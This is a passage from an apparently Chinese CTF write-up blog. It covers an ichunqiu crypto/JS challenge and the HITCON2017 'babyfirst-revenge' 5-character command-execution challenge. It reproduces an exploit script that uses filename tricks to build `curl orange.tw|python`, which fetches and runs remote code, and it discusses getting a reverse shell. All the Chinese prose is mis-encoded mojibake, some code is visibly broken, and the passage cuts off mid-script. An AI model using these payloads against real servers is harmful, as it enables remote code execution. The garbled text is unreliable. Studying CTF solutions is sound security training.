class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;Off&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$d</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$e</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;flag_1s_n0t_h3re&quot;</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$g</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$h</span> = <span class="string">&quot;3133&quot;</span>;</span><br><span class="line">    <span class="variable">$l</span> = <span class="variable">$f</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$f</span> . <span class="variable">$h</span>);</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$l</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$d</span> ? <span class="variable">$d</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span> . <span class="variable">$g</span>) , <span class="number">0</span>, <span class="number">16</span>) . <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="variable">$q</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt;= <span class="number">255</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$q</span>[<span class="variable">$r</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$l</span>[<span class="variable">$r</span> % <span class="variable">$m</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="number">256</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$r</span>] + <span class="variable">$q</span>[<span class="variable">$r</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$r</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$r</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg==&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$u</span> = <span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="variable">$n</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$u</span> = (<span class="variable">$u</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$u</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$u</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$u</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">        <span class="variable">$o</span>.= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$b</span>[<span class="variable">$r</span>]) ^ (<span class="variable">$p</span>[(<span class="variable">$p</span>[<span class="variable">$u</span>] + <span class="variable">$p</span>[<span class="variable">$s</span>]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return $h . str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($o));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">&quot;3133g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg==&quot;</span>),<span class="string">&quot;flag_1s_n0t_h3re&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ°ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000ff37e751ba467c59flag is in flag.jsqÃ¶=ÃˆÃ”pâ€“Â³Â¬â€“&gt;Oï¿½Ãª:ÃœÃ¯(]Â¥Å¾</span><br></pre></td></tr></table></figure><p>å‘ç°å†…å®¹<code>flag is in flag.js</code> é‚£ä¹ˆç»§ç»­åˆ†æflag.js æ ¼å¼ä¾æ—§å¾ˆçƒ‚,ç¾åŒ–ä¸€ä¸‹,ç„¶åå‘ç°æœ€åæœ‰ä¸€æ®µæ··æ·†,è§£ä¸€ä¸‹,å¾—åˆ°ç»“æœ é‡ç‚¹å…³æ³¨è§£æ··æ·†çš„åœ°æ–¹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Key</span> = <span class="string">&quot;7a57a5a743894a0e&quot;</span>;</span><br><span class="line"><span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Iso10126</span> = &#123;</span><br><span class="line">    <span class="attr">pad</span>: <span class="keyword">function</span>(<span class="params">data, blockSize</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> blockSizeBytes = blockSize * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">var</span> nPaddingBytes = blockSizeBytes - data.<span class="property">sigBytes</span> % blockSizeBytes;</span><br><span class="line">        data.<span class="title function_">concat</span>(<span class="title class_">CryptoJS</span>.<span class="property">lib</span>.<span class="property">WordArray</span>.<span class="title function_">random</span>(nPaddingBytes - <span class="number">1</span>)).<span class="title function_">concat</span>(<span class="title class_">CryptoJS</span>.<span class="property">lib</span>.<span class="property">WordArray</span>.<span class="title function_">create</span>([nPaddingBytes &lt;&lt; <span class="number">24</span>], <span class="number">1</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">unpad</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> nPaddingBytes = data.<span class="property">words</span>[(data.<span class="property">sigBytes</span> - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">2</span>] &amp; <span class="number">0xff</span>;</span><br><span class="line">        data.<span class="property">sigBytes</span> -= nPaddingBytes</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> aesEncrypt = <span class="keyword">function</span>(<span class="params">data, keyStr, ivStr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sendData = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(keyStr);</span><br><span class="line">    <span class="keyword">var</span> iv = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(ivStr);</span><br><span class="line">    <span class="keyword">var</span> encrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(sendData, key, &#123;</span><br><span class="line">        <span class="attr">iv</span>: iv,</span><br><span class="line">        <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Iso10126</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">stringify</span>(encrypted.<span class="property">ciphertext</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> aesDecrypt = <span class="keyword">function</span>(<span class="params">data, keyStr, ivStr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(keyStr);</span><br><span class="line">    <span class="keyword">var</span> iv = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(ivStr);</span><br><span class="line">    <span class="keyword">var</span> decrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(data, key, &#123;</span><br><span class="line">        <span class="attr">iv</span>: iv,</span><br><span class="line">        <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Iso10126</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> decrypted.<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> hint = <span class="string">&quot;SSNRTPIuHLUxqtJmq8mDDPtexRU7RTjNO34tLqz+Tpw=&quot;</span>;</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸ªaes-cbc,ç„¶åè§£å¯†ä¸€ä¸‹,ä½†æ˜¯å‘ç°ivæœªçŸ¥,äºæ˜¯ä½¿ç”¨keyä½œä¸ºiv ç„¶åå¾—åˆ°ç»“æœ <img src="/images/2018/08/ichunqiu-1.jpg" alt="blacsheep" /> ç„¶åå¹¶ä¸çŸ¥é“è¦æ€ä¹ˆå¤„ç†äº†,ä¸æ˜¯å¾ˆæ‡‚å‡ºé¢˜äºº.</p><h4 id="çœ‹äº†åˆ«äººçš„è§£æ³•">çœ‹äº†åˆ«äººçš„è§£æ³•</h4><p>https://xhyeax.github.io/2019/01/26/icq-2nd-happy-rec/ åˆ«äººç”¨çš„git_extractor ç„¶ådiffæ‹¿flag,diffä¸€ä¸‹å‘ç°å¹¶ä¸çŸ¥é“é‚£ä¸ªjsçš„æ–‡ä»¶æ˜¯çœŸçš„flag,æ„Ÿè§‰å‡ºé¢˜äººçœŸçš„ç¿æ™º...æˆ‘æ˜¯æ‡’å¾—å»çŒœflagäº†...</p><h2 id="hitcon2017">HITCON2017</h2><h3 id="babyfirst-revenge">babyfirst-revenge</h3><p>5å­—ç¬¦å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>æœ¬æ¥æƒ³æ³•æ˜¯é€šè¿‡<code>\</code>æ¥å¤šæ¬¡æ‰§è¡Œ,ä¸è¿‡ä¼¼ä¹å¹¶ä¸å¯ä»¥,<code>exec()</code>æ¯æ¬¡å¿…å®šæ˜¯æ‰§è¡Œä¸€æ¡å®Œæ•´çš„å‘½ä»¤è€Œä¸å¯ä»¥åˆ†å‰²,æ‰€ä»¥åªèƒ½æ‰¾å…¶ä»–çš„æ–¹æ³• æƒ³äº†å¾ˆä¹…å¹¶æ²¡æœ‰æƒ³å‡ºæ¥,å»çœ‹äº†åˆ«äººçš„wp,çœ‹åˆ°çš„æ€è·¯å¤§æ¦‚å°±æ˜¯é€šè¿‡é‡å®šå‘å†™æ–‡ä»¶,é€šè¿‡æ„é€ æ–‡ä»¶åæ¥æ‰§è¡Œå‘½ä»¤,çŸ¥é“å¤§æ¦‚çš„æ€è·¯ä¹‹åæˆ‘å°±åˆå¼€å§‹è¸©å‘äº†. è‡ªå·±æ„é€ æ„é€ äº†å¾ˆä¹…éƒ½æ˜¯å¤±è´¥,è¦ä¹ˆéœ€è¦6ä¸ªå­—ç¬¦,è¦ä¹ˆå°‘äº†ç©ºæ ¼,å¹¶æ²¡æœ‰åŠæ³•,ç„¶åçœ‹äº†åˆ«äººçš„wp,å¤ç°çš„æ—¶å€™å‘ç°å±…ç„¶è¿˜æ˜¯å¤±è´¥,æœ€æ— è¯­çš„æ˜¯,ä½¿ç”¨orangeçš„å®˜æ–¹wpä¸­çš„payloadå±…ç„¶ä¹Ÿæ²¡èƒ½å†™å‡º<code>ls -t&gt;g</code>çš„å‘½ä»¤... ä¸è¿‡å…¶å®è¿™é‡Œæ˜¯è¸©å‘äº†,<code>exec</code>çš„æ‰§è¡Œå’Œshellçš„æ‰§è¡Œä¼¼ä¹æ˜¯ä¸åŒçš„,æˆ‘ä¹Ÿä¸å¤ªç†è§£ä¸ºä»€ä¹ˆ å…ˆç»™å‡ºå®˜æ–¹wpçš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;ls\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;_&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;-t\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\&gt;g&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;&gt;_&#x27;</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.twpython`</span></span><br><span class="line">    <span class="string">&#x27;&gt;on&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;th\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;py\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\\\&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;tw\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;e.\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;ng\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;ra\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;o\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;\ \\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;rl\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cu\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # exec</span></span><br><span class="line"><span class="string">    &#x27;</span>sh _<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>sh g<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r = requests.get(&#x27;</span>http://<span class="number">52.199</span><span class="number">.204</span><span class="number">.34</span>/?reset=<span class="number">1</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 5 </span></span><br><span class="line"><span class="string">    r = requests.get(&#x27;</span>http://<span class="number">52.199</span><span class="number">.204</span><span class="number">.34</span>/?cmd=<span class="string">&#x27; + quote(i) )</span></span><br><span class="line"><span class="string">    print i</span></span><br><span class="line"><span class="string">    sleep(0.2)</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œçš„å‰é¢éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># generate `ls -t&gt;g` file</span><br><span class="line">&#x27;&gt;ls\\&#x27;, </span><br><span class="line">&#x27;ls&gt;_&#x27;, </span><br><span class="line">&#x27;&gt;\ \\&#x27;, </span><br><span class="line">&#x27;&gt;-t\\&#x27;, </span><br><span class="line">&#x27;&gt;\&gt;g&#x27;, </span><br><span class="line">&#x27;ls&gt;&gt;_&#x27;, </span><br></pre></td></tr></table></figure><p>åœ¨shellä¸­ç›´æ¥æ‰§è¡Œç»“æœæ˜¯è¿™æ ·çš„ <img src="/images/2018/08/ichunqiu-2.jpg" alt="blacsheep" /> ä¸è¿‡å½“æˆ‘ä»¬ç›´æ¥curlæˆ–è€…ç½‘é¡µè®¿é—®ä¹‹åç»“æœåˆä¸ä¸€æ · <img src="/images/2018/08/ichunqiu-3.jpg" alt="blacsheep" /> ç„å­¦åŸå› ,å¦‚æœæœ‰çŸ¥é“åŸç†çš„å¯ä»¥å‘é‚®ä»¶ç»™æˆ‘,æˆ–è€…åŠ æˆ‘qqæˆ–è€…ç•™è¨€éƒ½è¡Œ,éå¸¸æ„Ÿè°¢ ç„¶åè¸©çš„ç¬¬äºŒä¸ªå‘æ˜¯shellä¸­åˆ›å»º<code>s \</code>çš„æ–‡ä»¶å’Œcurlåˆ›å»ºä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ è¿™ä¸ªæœ¬æ¥æœ‰ä¸ªpayload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">-t\</span></span><br><span class="line"><span class="language-bash">&gt;\&gt;q</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">l\</span></span><br><span class="line"><span class="language-bash">&gt;s\ \</span></span><br><span class="line"><span class="language-bash"><span class="built_in">ls</span>&gt;a</span></span><br><span class="line"><span class="meta prompt_">ls&gt;</span><span class="language-bash">&gt;a</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡ä¹Ÿæ˜¯è¿™é‡Œè¸©å‘äº†å¤±è´¥äº†,æœ¬æ¥ä»¥ä¸ºè¦å…­ä¸ªå­—ç¬¦,å…¶å®5ä¸ªå°±å¯ä»¥äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7$ curl &#x27;http://127.0.0.1?cmd=&gt;s\%20\&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿”å›ç½‘é¡µ</span></span><br><span class="line"></span><br><span class="line">blacsheep@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7$ ls</span><br><span class="line">&#x27;s \&#x27;</span><br><span class="line">blacsheep@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7$ sudo su</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# &gt;s\ \</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7<span class="comment"># ls</span></span></span><br><span class="line">&#x27;s &#x27;  &#x27;s \&#x27;</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# rm ./*</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# ls</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# &gt;s\ \\</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# ls</span><br><span class="line">&#x27;s \&#x27;</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7#</span><br></pre></td></tr></table></figure><p>curlç”¨åˆ°çš„payloadè¿›è¡Œ<code>urldecode</code>åæœ‰5ä¸ªå­—ç¬¦ å³<code>?cmd=&gt;s\ \</code>å³å¯åˆ›å»ºå‡º<code>s(ç©ºæ ¼)</code>æ–‡ä»¶ ä½†æ˜¯shellæ‰§è¡Œéœ€è¦6ä¸ªå­—ç¬¦ å³<code>&gt;s\ \\</code>æ‰èƒ½åˆ›å»ºå‡º<code>s(ç©ºæ ¼)</code>æ–‡ä»¶ æ³¨æ„åˆ°è¿™äº›å°±å¯ä»¥å¾ˆå®¹æ˜“çš„å†™å‡º<code>ls -t&gt;g</code>è¿™ç§ç±»ä¼¼çš„å‘½ä»¤ èƒ½å¤Ÿåˆ›å»ºè¿™ä¸ªå‘½ä»¤çš„è¯,åç»­åªç”¨åè¿‡æ¥æŠŠåå¼¹shellçš„å‘½ä»¤å†™å…¥å³å¯æ‹¿åˆ°shell ä¸è¿‡å¼¹shellçš„æ—¶å€™åˆç¢°åˆ°é—®é¢˜,æ‰§è¡Œçš„å‘½ä»¤é‡Œé¢ä¸å¯åŒ…å«<code>/</code>å­—ç¬¦,æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç”¨ä¼ ç»Ÿçš„åå¼¹shell,è€Œä¸”curlçš„è¯ä¸å¯ä»¥åŒ…å«è·¯å¾„,æ‰€ä»¥è¿™é‡Œæˆ‘æ­äº†ä¸€ä¸ªdocker,ç„¶åå†å»è®¿é—®æ‹¿åˆ°shell,è¿™é‡Œè¿˜è¦æ³¨æ„åˆ›å»ºçš„æ–‡ä»¶çš„åç§°ä¸å¯ä»¥é‡å¤,å¦åˆ™åªä¼šåˆ›å»ºä¸€æ¬¡,å°±ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œå¤±è´¥ ç»™ä¸ªç®€æ˜“exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;ls\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;_&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;-t\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\&gt;g&#x27;</span>, </span><br><span class="line">    <span 